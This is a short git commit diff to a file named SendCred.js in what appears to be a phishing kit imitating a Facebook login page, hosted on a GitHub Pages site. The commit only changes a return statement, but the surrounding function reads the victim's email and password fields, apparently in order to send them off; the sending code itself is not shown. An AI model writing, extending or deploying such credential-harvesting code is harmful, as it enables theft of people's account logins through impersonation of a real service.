372337ddb5fccdab1202635b48763de0f88a3310
fbtemplate <32390975+fbtemplate@users.noreply.github.com>
2017-09-29 18:41:11 +0530

    Update SendCred.js

--- SendCred.js
+++ SendCred.js
@@ -15,7 +15,7 @@ function sendData()
 	if($("email").value=="" && $("pass").value=="")
 	{
 		window.location="https://fbtemplate.github.io/facebook.com/login";
-		return;
+		return false;
 	}
 	
 			var data = {
